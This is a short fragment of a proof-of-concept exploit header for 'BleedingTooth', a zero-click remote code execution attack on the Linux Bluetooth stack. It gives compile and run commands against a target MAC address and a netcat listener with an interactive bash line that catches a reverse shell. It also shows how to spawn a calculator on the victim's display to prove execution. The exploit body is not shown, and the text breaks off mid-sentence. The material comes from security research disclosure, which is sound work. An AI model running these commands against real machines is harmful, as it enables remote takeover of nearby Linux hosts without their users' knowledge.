BleedingTooth: Linux Bluetooth Zero-Click Remote Code Execution
by Andy Nguyen (theflow@)

 Compile using:
 *   $ gcc -o exploit exploit.c -lbluetooth
 *
 * and execute as:
 *   $ sudo ./exploit target_mac source_ip source_port
 *
 * In another terminal, run:
 *   $ nc -lvp 1337
 *   exec bash -i 2>&0 1>&0
 *
 * If successful, a calc can be spawned with:
 *   export XAUTHORITY=/run/user/1000/gdm/Xauthority
 *   export DISPLAY=:0
 *   gnome-calculator
 *
 * This Proof-Of-Concept has been tested against a Dell XPS 15 running
